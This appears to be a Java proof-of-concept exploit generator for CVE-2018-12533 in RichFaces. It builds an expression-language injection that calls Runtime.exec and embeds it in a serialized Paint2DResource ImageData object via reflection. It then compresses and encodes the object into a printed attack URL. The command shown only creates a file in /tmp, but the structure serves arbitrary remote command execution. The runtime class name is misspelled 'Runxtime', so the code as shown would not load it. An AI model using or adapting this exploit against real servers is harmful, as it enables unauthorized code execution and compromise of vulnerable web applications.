package cve_2018_12533;

import com.sun.facelets.el.LegacyMethodBinding;
import com.sun.facelets.el.TagMethodExpression;
import com.sun.facelets.tag.TagAttribute;
import com.sun.facelets.tag.Location;
import java.util.Base64;

import org.ajax4jsf.util.base64.URL64Codec;
import org.jboss.el.MethodExpressionImpl;

import javax.faces.context.FacesContext;
import javax.faces.el.MethodBinding;
import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.io.OutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Modifier;
import java.util.zip.Deflater;

public class Main {
	//https://www.lucifaer.com/2018/12/05/RF-14310%EF%BC%88CVE-2018-12533%EF%BC%89%E5%88%86%E6%9E%90/
    public static void main(String[] args) throws Exception{

    	
    	String pocEL = "#{request.getClass().getClassLoader().loadClass(\"java.lang.Runxtime\").getMethod(\"getRuntime\").invoke(null).exec(\"touch /tmp/cve_2018_12533\")}";
    	
         // 根据文章https://www.anquanke.com/post/id/160338
         Class cls = Class.forName("javax.faces.component.StateHolderSaver");
         Constructor ct = cls.getDeclaredConstructor(FacesContext.class, Object.class);
         ct.setAccessible(true);

         Location location = new Location("", 0, 0);
         TagAttribute tagAttribute = new TagAttribute(location, "", "", "", "createContent="+pocEL);
       
         // 1. 设置ImageData
         //    构造ImageData_paint
         MethodExpressionImpl methodExpression = new MethodExpressionImpl(pocEL, null, null, null, null, new Class[]{OutputStream.class, Object.class});
         TagMethodExpression tagMethodExpression = new TagMethodExpression(tagAttribute, methodExpression);
         MethodBinding methodBinding = new LegacyMethodBinding(tagMethodExpression);
         Object _paint = ct.newInstance(null, methodBinding);

         Class clzz = Class.forName("org.richfaces.renderkit.html.Paint2DResource");
         Class innerClazz[] = clzz.getDeclaredClasses();
         for (Class c : innerClazz){
             int mod = c.getModifiers();
             String modifier = Modifier.toString(mod);
             if (modifier.contains("private")){
                 Constructor cc = c.getDeclaredConstructor();
                 cc.setAccessible(true);
                 Object imageData = cc.newInstance(null);

                 //    设置ImageData_width
                 Field _widthField = imageData.getClass().getDeclaredField("_width");
                 _widthField.setAccessible(true);
                 _widthField.set(imageData, 300);

                 //    设置ImageData_height
                 Field _heightField = imageData.getClass().getDeclaredField("_height");
                 _heightField.setAccessible(true);
                 _heightField.set(imageData, 120);

                 //    设置ImageData_data
                 Field _dataField = imageData.getClass().getDeclaredField("_data");
                 _dataField.setAccessible(true);
                 _dataField.set(imageData, null);

                 //    设置ImageData_format
                 Field _formatField = imageData.getClass().getDeclaredField("_format");
                 _formatField.setAccessible(true);
                 _formatField.set(imageData, 2);

                 //    设置ImageData_paint
                 Field _paintField = imageData.getClass().getDeclaredField("_paint");
                 _paintField.setAccessible(true);
                 _paintField.set(imageData, _paint);

                 //    设置ImageData_paint
                 Field cacheableField = imageData.getClass().getDeclaredField("cacheable");
                 cacheableField.setAccessible(true);
                 cacheableField.set(imageData, false);

                 //    设置ImageData_bgColor
                 Field _bgColorField = imageData.getClass().getDeclaredField("_bgColor");
                 _bgColorField.setAccessible(true);
                 _bgColorField.set(imageData, 0);

                 // 2. 序列化
                 ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
                 ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
                 objectOutputStream.writeObject(imageData);
                 objectOutputStream.flush();
                 objectOutputStream.close();
                 byteArrayOutputStream.close();

                 // 3. 加密（zip+base64）
                 byte[] pocData = byteArrayOutputStream.toByteArray();
                 Deflater compressor = new Deflater(1);
                 byte[] compressed = new byte[pocData.length + 100];
                 compressor.setInput(pocData);
                 compressor.finish();
                 int totalOut = compressor.deflate(compressed);
                 byte[] zipsrc = new byte[totalOut];
                 System.arraycopy(compressed, 0, zipsrc, 0, totalOut);
                 compressor.end();
                 byte[]dataArray = URL64Codec.encodeBase64(zipsrc);

                 // 4. 打印最后的poc
                 String poc = "org.richfaces.renderkit.html.Paint2DResource/DATA/" + new String(dataArray, "ISO-8859-1") + "";
                 System.out.println(poc);
             }
         }
     }
 }